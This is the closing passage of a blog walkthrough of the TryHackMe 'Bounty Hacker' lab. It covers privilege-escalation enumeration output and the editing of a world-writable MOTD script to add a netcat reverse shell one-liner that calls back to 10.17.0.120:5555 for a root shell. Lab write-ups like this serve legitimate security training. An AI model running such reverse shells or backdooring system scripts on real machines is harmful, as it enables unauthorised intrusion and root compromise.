<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>key4<span style="color:#f92672">.</span>db                                              
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>places<span style="color:#f92672">.</span>sqlite                      
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin<span style="color:#f92672">/.</span>mozilla<span style="color:#f92672">/</span>firefox<span style="color:#f92672">/</span>o0cm87l0<span style="color:#f92672">.</span>default<span style="color:#f92672">-</span>release<span style="color:#f92672">/</span>prefs<span style="color:#f92672">.</span>js
</code></pre></div><p>Can we use firefox&rsquo;s <code>credentials db</code> for passwords? Let&rsquo;s check all in the end.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">+</span>] Interesting writable files owned by me <span style="color:#f92672">or</span> writable by everyone (<span style="color:#f92672">not</span> <span style="color:#f92672">in</span> Home) (max <span style="color:#ae81ff">500</span>)                                                                                                                         
[i] https:<span style="color:#f92672">//</span>book<span style="color:#f92672">.</span>hacktricks<span style="color:#f92672">.</span>xyz<span style="color:#f92672">/</span>linux<span style="color:#f92672">-</span>unix<span style="color:#f92672">/</span>privilege<span style="color:#f92672">-</span>escalation<span style="color:#75715e">#writable-files                                                                                                                                     </span>
<span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>mqueue                                                                                                                                                                                                        
<span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>shm                                                                                                                                                                                                           
<span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>update<span style="color:#f92672">-</span>motd<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>header                                                                                                                                                                                       
<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>lin                                                                                                                                                                                                          
<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>lock                                                                                                                                                                                                          
<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>user<span style="color:#f92672">/</span><span style="color:#ae81ff">1001</span>                                                                                                                                                                                                     
<span style="color:#f92672">/</span>run<span style="color:#f92672">/</span>user<span style="color:#f92672">/</span><span style="color:#ae81ff">1001</span><span style="color:#f92672">/</span>systemd                                                                                                                                                                                             
<span style="color:#f92672">/</span>tmp                                                                                                                                                                                                               
<span style="color:#f92672">/</span>tmp<span style="color:#f92672">/.</span>font<span style="color:#f92672">-</span>unix                                                                                          
<span style="color:#f92672">/</span>tmp<span style="color:#f92672">/.</span>ICE<span style="color:#f92672">-</span>unix                                                                                           
<span style="color:#f92672">/</span>tmp<span style="color:#f92672">/.</span>Test<span style="color:#f92672">-</span>unix                                                                                          
<span style="color:#f92672">/</span>tmp<span style="color:#f92672">/.</span>X11<span style="color:#f92672">-</span>unix                                                                                           
<span style="color:#f92672">/</span>tmp<span style="color:#f92672">/.</span>XIM<span style="color:#f92672">-</span>unix                                                                                                                                                                                                     
<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>crash                                                                                               
<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>lightdm<span style="color:#f92672">-</span>data<span style="color:#f92672">/</span>lin                                                                                                                                                                                          
<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>metrics                                                                                             
<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>tmp
</code></pre></div><p><code>/etc/update-motd.d/00-header</code> is writeable? really? Noice! We can edit this and SSH again as our user to execute this and get reverse shell!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~</span><span style="color:#960050;background-color:#1e0010">$</span> ls <span style="color:#f92672">-</span>la <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>update<span style="color:#f92672">-</span>motd<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>header
<span style="color:#f92672">-</span>rwxr<span style="color:#f92672">-</span>xrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1221</span> Jun  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>update<span style="color:#f92672">-</span>motd<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>header
</code></pre></div><p>It is indded <strong>writeable!</strong> Let&rsquo;s add reverse shell one liner in the file right after shebang <code>#!/bin/sh</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lin<span style="color:#a6e22e">@bountyhacker</span>:<span style="color:#f92672">~</span><span style="color:#960050;background-color:#1e0010">$</span> which nc 
<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>nc
</code></pre></div><p>Let&rsquo;s use the following for reverses shell on <strong>port 5555</strong> of our host.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.17.0.120 <span style="color:#ae81ff">5555</span> &gt;/tmp/f
</code></pre></div><p>After adding reverse shell one-liner to the file, it looks like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.17.0.120 <span style="color:#ae81ff">5555</span> &gt;/tmp/f

<span style="color:#75715e">#</span>
<span style="color:#75715e">#    00-header - create the header of the MOTD</span>
<span style="color:#75715e">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    This program is free software; you can redistribute it and/or modify</span>
<span style="color:#75715e">#    it under the terms of the GNU General Public License as published by</span>
<span style="color:#75715e">#    the Free Software Foundation; either version 2 of the License, or</span>
<span style="color:#75715e">#    (at your option) any later version.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    This program is distributed in the hope that it will be useful,</span>
<span style="color:#75715e">#    but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span style="color:#75715e">#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span style="color:#75715e">#    GNU General Public License for more details.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    You should have received a copy of the GNU General Public License along</span>
<span style="color:#75715e">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span style="color:#75715e">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span style="color:#f92672">[</span> -r /etc/lsb-release <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> . /etc/lsb-release

<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$DISTRIB_DESCRIPTION<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -x /usr/bin/lsb_release <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
        <span style="color:#75715e"># Fall back to using the very slow lsb_release utility</span>
        DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>lsb_release -s -d<span style="color:#66d9ef">)</span>
<span style="color:#66d9ef">fi</span>

printf <span style="color:#e6db74">&#34;Welcome to %s (%s %s %s)\n&#34;</span> <span style="color:#e6db74">&#34;</span>$DISTRIB_DESCRIPTION<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -o<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>Can see our one-liner in the second line, let&rsquo;s save this and do <strong>SSH</strong> again as the user <strong>lin.</strong> Remember to start listener on <strong>port 5555</strong> beforehand!</p>
<h3 id="root-shell">Root shell!</h3>
<p><img src="/img/bounty_hacker-thm/Untitled%202.png" alt=""></p>
<p>Alright, that was an easy machine but we wasted more than necessary time (i.e. 30 minutes on an easy machine).</p>
<p>Hopefully, you enjoyed the writeup! 😇</p>
<hr>
<h3 id="things-learnt-and-not-todos">Things learnt (and not todos):</h3>
<ul>
<li>Always check the files we already have for username/passwords</li>
<li>Don&rsquo;t waste unnecessary time with long lists bruteforcing against slow protocols</li>
</ul>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://umar0x01.sh/post/ignite-thm/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Ignite - TryHackMe Walkthrough</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://umar0x01.sh/post/internal-thm/">
                  <span class="button__text">Internal - TryHackMe Walkthrough</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "umar0x01" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
      
    

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2021 <a href="https://github.com/Anon-Exploiter" target="_blank" rel="noopener">Umar_0x01</a></span>
        <span> twitter<a href="https://twitter.com/syed__umar" target="_blank" rel="noopener">@syed__umar</a>&nbsp;</span>
        <span> <a href="https://umar0x01.sh/archive" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
      </div>
    
  </div>
</footer>
<script src="https://umar0x01.sh/assets/main.js"></script>
<script src="https://umar0x01.sh/assets/prism.js"></script>








      
    </div>

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
    
  </body>
</html>
